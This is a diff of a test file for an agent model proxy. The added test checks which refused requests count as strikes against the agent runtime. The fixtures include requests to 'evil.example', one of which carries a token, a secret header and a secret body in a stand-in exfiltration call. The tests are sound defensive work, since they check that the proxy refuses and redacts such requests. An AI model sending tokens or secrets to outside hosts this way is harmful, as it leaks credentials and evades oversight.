@@ -380,6 +380,33 @@ describe('model proxy', () => {
     expect(log.mock.calls.at(-1)).toEqual(['agent proxy: refused a model request (endpoint) (and 9 more like it before)']);
   });
 
+  test('proxy-strikes-only-the-runtimes-refusals', async () => {
+    // Main's side or upstream: no key, a redirect, the route or model just switched.
+    const noKey = await setup({ key: false });
+    noKey.emit(request());
+    await noKey.ended();
+    const redirect = await setup({ fetch: () => Promise.reject(new Error("Attempted to redirect, but redirect policy was 'error'")) });
+    redirect.emit(request());
+    await redirect.ended();
+    const switched = await setup({ settings: { route: 'gateway', modelId: 'anthropic/claude-sonnet-5-5' } });
+    switched.emit(request());
+    await switched.ended();
+    const model = await setup({ settings: { route: 'byok-anthropic', modelId: 'anthropic/claude-opus-5-5' } });
+    model.emit(request());
+    await model.ended();
+    for (const run of [noKey, redirect, switched, model]) {
+      expect(run.of('fetch.error')[0]?.code).toBe('refused');
+      expect(run.strike).not.toHaveBeenCalled();
+    }
+    expect([noKey, redirect, switched, model].map((run) => run.proxy.state().lastRefusal)).toEqual(['no-key', 'redirect', 'endpoint', 'model']);
+    // The runtime's own doing: an endpoint no route has, a server tool.
+    const runtime = await setup();
+    runtime.emit(request({ requestId: 'a', url: 'https://evil.example/v1/messages' }));
+    runtime.emit(request({ requestId: 'b', body: JSON.stringify({ model: 'claude-sonnet-5-5', max_tokens: 64, messages: [], tools: [{ name: 'web_search', type: 'web_search_20250305' }] }) }));
+    await vi.waitFor(() => expect(runtime.of('fetch.error').length).toBe(2));
+    expect(runtime.strike).toHaveBeenCalledTimes(2);
+  });
+
   test('proxy-refusal-logged-without-detail', async () => {
     const { emit, of, log } = await setup();
     emit(request({ url: 'https://evil.example/collect?token=abc123', headers: [['x-secret', 'shh']], body: '{"secret":"body"}' }));
